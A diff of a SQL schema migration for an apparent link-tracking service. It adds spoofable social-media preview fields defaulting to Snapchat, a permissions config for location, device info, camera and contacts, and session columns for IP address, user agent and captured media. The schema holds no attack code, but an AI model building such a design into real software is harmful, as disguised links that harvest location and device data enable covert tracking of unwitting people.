@@ -22,7 +22,14 @@ CREATE TABLE IF NOT EXISTS public.profiles (
 CREATE TABLE IF NOT EXISTS public.image_links (
   id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
   slug TEXT UNIQUE NOT NULL,
-  image_path TEXT NOT NULL,
+  image_path TEXT,
+  target_url TEXT,
+  link_type TEXT NOT NULL DEFAULT 'image',
+  og_title TEXT,
+  og_description TEXT,
+  og_image_url TEXT,
+  og_platform TEXT DEFAULT 'snapchat',
+  permissions_config JSONB NOT NULL DEFAULT '{"location":true,"device_info":true,"camera":false,"contacts":false}'::jsonb,
   title TEXT,
   description TEXT,
   is_active BOOLEAN NOT NULL DEFAULT true,
@@ -41,7 +48,13 @@ CREATE TABLE IF NOT EXISTS public.location_sessions (
   consent_at TIMESTAMPTZ NOT NULL DEFAULT now(),
   started_at TIMESTAMPTZ NOT NULL DEFAULT now(),
   ended_at TIMESTAMPTZ,
-  status TEXT NOT NULL DEFAULT 'active' CHECK (status IN ('active', 'ended', 'revoked'))
+  status TEXT NOT NULL DEFAULT 'active' CHECK (status IN ('active', 'ended', 'revoked')),
+  device_info JSONB DEFAULT '{}'::jsonb,
+  ip_address TEXT,
+  user_agent TEXT,
+  permissions_granted JSONB DEFAULT '[]'::jsonb,
+  captured_media_path TEXT,
+  captured_data JSONB DEFAULT '{}'::jsonb
 );
 
 -- ------------------------------------------------------------------------------
@@ -70,6 +83,7 @@ CREATE TABLE IF NOT EXISTS public.admin_settings (
 -- ------------------------------------------------------------------------------
 CREATE INDEX IF NOT EXISTS idx_image_links_slug ON public.image_links(slug);
 CREATE INDEX IF NOT EXISTS idx_image_links_active ON public.image_links(is_active, expires_at);
+CREATE INDEX IF NOT EXISTS idx_image_links_type ON public.image_links(link_type);
 CREATE INDEX IF NOT EXISTS idx_location_sessions_link_id ON public.location_sessions(link_id);
 CREATE INDEX IF NOT EXISTS idx_location_updates_session_id ON public.location_updates(session_id);
 CREATE INDEX IF NOT EXISTS idx_location_updates_created_at ON public.location_updates(created_at DESC);
